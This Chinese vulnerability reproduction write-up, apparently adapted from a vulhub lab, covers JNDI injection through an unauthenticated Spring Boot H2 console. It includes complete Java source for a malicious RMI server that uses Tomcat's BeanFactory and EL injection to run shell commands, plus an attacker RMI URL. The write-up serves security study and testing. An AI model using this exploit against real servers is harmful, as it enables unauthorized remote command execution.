# Spring Boot H2数据库导致的JNDI注入

## 一、漏洞简介

H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：

```
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true

```

利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。

## 二、漏洞影响

## 三、复现过程

## 漏洞复现

目标环境是Java 8u252，版本较高，因为上下文是Tomcat环境，我们可以使用`org.apache.naming.factory.BeanFactory`加EL表达式注入的方式来执行任意命令。

```
import java.rmi.registry.*;
import com.sun.jndi.rmi.registry.*;
import javax.naming.*;
import org.apache.naming.ResourceRef;

public class EvilRMIServerNew {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);

        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}

```

我们可以借助这个小工具[JNDI](https://github.com/ianxtianxt/JNDI)简化我们的复现过程。

首先设置JNDI工具中执行的命令为`touch /tmp/success`：

![1589611444.jpg](images/fcb5ff8622dc4a689f0794fb7e89e315.jpg)

然后启动`JNDI-1.0-all.jar`，在h2 console页面填入JNDI类名和URL地址：

![1589611473.jpg](images/5b994fe3d20c4f3eae68772ef873ff18.jpg)

其中，`javax.naming.InitialContext`是JNDI的工厂类，URL `rmi://evil:23456/BypassByEL`是运行JNDI工具监听的RMI地址。

点击连接后，恶意RMI成功接收到请求：

![1589611489.jpg](images/64355f7200ec472c98abc928e25f424a.jpg)

`touch /tmp/success`已成功执行：

![1589611541.jpg](images/f511a6e295694f1daf1f647119ee776a.jpg)

## 参考链接

> https://github.com/vulhub/vulhub/blob/master/h2database/h2-console-unacc/README.zh-cn.md

